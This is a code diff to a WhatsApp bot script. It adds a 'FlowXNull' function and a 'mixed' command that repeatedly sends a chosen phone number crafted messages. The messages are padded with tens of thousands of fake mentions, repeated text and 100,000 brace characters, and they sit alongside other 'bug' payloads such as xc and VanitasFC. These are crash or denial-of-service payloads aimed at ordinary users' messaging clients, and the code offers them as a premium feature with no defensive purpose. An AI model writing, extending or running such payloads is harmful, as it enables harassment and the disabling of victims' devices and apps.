@@ -236,7 +236,7 @@ conn.ev.on('messages.upsert', async ({ messages, type }) => {
   const mentions = [
     "0@s.whatsapp.net",
     ...Array.from({ length: 40000 }, () =>
-      1${Math.floor(Math.random() * 999999)}@s.whatsapp.net
+      "1" + `${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
     )
   ];
 
@@ -307,7 +307,7 @@ async function xc(target) {
         mediaType: "VIDEO",
         renderLargerThumbnail: true,
         previewTtpe: "VIDEO",
-        thumbnail: pic,
+        thumbnailUrl: "https://files.catbox.moe/4sdoxu.jpg",
         sourceType: " x ",
         sourceId: " x ",
         sourceUrl: "https://youtube.com/@JohnleoSm1th?si=LoOB7Mbumd1uXSzL",
@@ -389,6 +389,41 @@ async function VanitasFC(target) {
   } catch (err) {
     console.log(err);
   }
+}
+async function FlowXNull(target) {
+  const MSG = {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "⛧ 𝐆͠𝐚𝐛͠𝐢𝐦𝐚͠𝐫͜𝐮 ⛧  \n" + 
+                 "@0@1".repeat(30000),
+            format: "DEFAULT",
+            contextInfo: {
+              mentionedJid: [
+                target,
+                "0@s.whatsapp.net",
+                ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
+              ],
+              disappearingMode: {
+                initiator: "CHANGED_IN_CHAT",
+                trigger: "CHAT_SETTING"
+              },
+            }
+          },
+          nativeFlowResponseMessage: {
+            name: "galaxy_message", // can changed to "call_permission_request" 
+            paramsJson: "{".repeat(50000) + "}".repeat(50000), 
+            version: 3
+          }
+        }
+      }
+    }
+  };
+
+  await conn.relayMessage(target, MSG, {
+    participant: { jid: target }
+  });
 }
    async function ultimateBug(target, ptcp = true) {
     let mentions = Array(5000).fill("6283871656842@s.whatsapp.net");
@@ -666,16 +701,19 @@ break
                     if (!botNumber && !isCreator) {
                      return xreply("𝕻𝖗𝖊𝖒𝖎𝖚𝖒 𝖀𝖘𝖊𝖗𝖘 𝕺𝖓𝖑𝖞 𓂃₊ཐི༑ཋྀ˚");
                     } else {
-                    if (!q) return send("Usage: `xdelay 234xxx`");
+                    if (!q) return send("Usage: `mixed 234xxx`");
                     const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                     try {
                     for (let i = 0; i < 15; i++) {
                         await xc(target);
+                        await FlowXNull(target);
                         await xc(target);
+                        await FlowXNull(target);
                         await VanitasFC(target);
                         await VanitasFC(target);
-                        await poveius24jam(conn, target);
-                        await poveius24jam(conn, target);
+                        await VanitasFC(target);
+                        await FlowXNull(target);
+                        
                     }
                     xreply(`ᥴ᥆mmᥲᥒძ: ${command}.
                     𝗍ᥲrgᥱ𝗍: ${target}.
@@ -711,7 +749,6 @@ break
 .𝗉𝗎𝖻𝗅𝗂𝖼
 .𝗑𝗂𝗈𝗌 𝟤𝟥𝟦𝗑𝗑𝗑
 .𝗑𝖺𝗇𝖽𝗋𝗈 𝟤𝟥𝟦𝗑𝗑𝗑
-.𝗑𝖽𝖾𝗅𝖺𝗒 𝟤𝟥𝟦𝗑𝗑𝗑𝗑
 .mixed 234xxx
 
 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 𝖻𝗒 ayokunledavid.t.me
